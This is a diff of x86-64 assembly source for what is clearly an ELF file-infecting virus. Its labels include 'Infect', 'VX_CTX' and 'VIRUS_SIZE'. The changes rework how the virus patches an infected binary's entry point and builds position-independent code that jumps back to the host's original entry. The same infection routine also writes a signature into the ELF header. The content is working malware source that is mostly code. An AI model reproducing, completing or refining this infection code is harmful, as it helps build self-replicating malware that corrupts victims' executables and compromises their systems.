@@ -83,18 +83,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
       call .Payload
     
-      .msg:    ; idk why I made it a byte array...
-        db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
-        db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
-        db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
-        db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
-        db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
-        db	0x74, 0x66, 0x75, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
-        db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
-        db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
-        db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
-        db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
-        db  0x00
+        MSG_PLACEHOLDER
         msglen equ $-.msg
 
       .Payload:
@@ -256,7 +245,13 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   pop   rdi
   add   rsp,  0x8
+  
+  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
+  ; mov   rbx,  r10
+  add   r10,  0xc000000 ; was rbx not r10
+  mov   dword [rdx + elf64_hdr.e_entry], r10d            ; patch entry
+  
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
   mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
@@ -265,22 +260,36 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add   rbx,  [rsp + VX_CTX.qEof]
   add   rbx,  rcx
 
-  mov   byte  [rbx + 0],    0x48
-  mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
-  mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
-  mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
-  mov   byte  [rbx + 10],   0xFF 
-  mov   byte  [rbx + 11],   0xE0                        ; jmp rax
-  
-  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
+  ; mov   byte  [rbx + 0],    0x48
+  ; mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
+  ; mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
+  ; mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
+  ; mov   byte  [rbx + 10],   0xFF 
+  ; mov   byte  [rbx + 11],   0xE0                        ; jmp rax
 
-  mov   rbx,  r10
-  add   rbx,  0xc000000
-  mov   dword [rdx + elf64_hdr.e_entry], ebx            ; patch entry
-  
+  mov   dword   [rbx + 0],  0x000000e8  ; call $+5
+  mov   word    [rbx + 4],  0x5800      ; pop rax   ; rax = RIP
+  mov   word    [rbx + 6],  0x2d48
+  add   rcx,    0x5                     ; <-- prob needs adjustment lol
+  mov   dword   [rbx + 8],  ecx         ; sub rax, vx_size + 5
+  mov   word    [rbx + 12], 0x2d48
+  mov   dword   [rbx + 14], r10d        ; sub rax, new_entry
+  mov   word    [rbx + 18], 0x0548
+  mov   rcx,    [rsp + VX_CTX.qOldEntry]
+  mov   dword   [rbx + 20], ecx         ; add rax, old_entry
+  mov   word    [rbx + 24], 0xe0ff      ; jmp rax
+
+  ; --> GET OEP DESPITE PIE <-----------------------------------------------< 
+  ; call  $+5             ; e8 00 00 00 00    ; 
+  ; pop   rax             ; 58                ; rax = RIP
+  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; VX_SIZE + 5, known statically
+  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; new entry (make sure to patch below so r10 += 0xc000000)
+  ; add   rax, 0x???????? ; 48 05 ?? ?? ?? ?? ; rax += VX_CTX.qOldEntry
+  ; jmp   rax             ; ff e0             ; 
+
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
-  mov   dword [rdx + 0xC], 0x534e4700
+  mov   dword [rdx + 0xc], 0x534e4700
 
   ;; OVERWRITE FILE >-------------------------------------------------------<
 
